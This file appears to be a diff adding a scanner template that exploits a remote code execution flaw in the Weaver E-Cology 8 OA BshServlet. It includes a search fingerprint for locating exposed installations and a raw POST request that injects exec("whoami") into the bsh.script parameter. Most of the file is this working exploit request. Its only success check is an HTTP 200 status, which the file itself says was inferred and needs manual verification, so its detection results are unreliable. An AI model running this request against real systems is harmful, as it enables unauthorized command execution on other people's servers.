@@ -1,0 +1,40 @@
+id: poc-d999f8fcef0bacc46a2f
+info:
+  name: 泛微E-Cology8BshServlet远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d999f8fcef0bacc46a2f0efdcd1a2f1a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d999f8fcef0bacc46a2f0efdcd1a2f1a
+    fofa: + hunter`app.name="泛微 e-cology OA"`
+http:
+- raw:
+  - 'POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+
+    Cache-Control: max-age=0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+    Content-Length: 49
+
+    Connection: close
+
+
+    bsh.script=exec("whoami");&bsh.servlet.output=raw'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
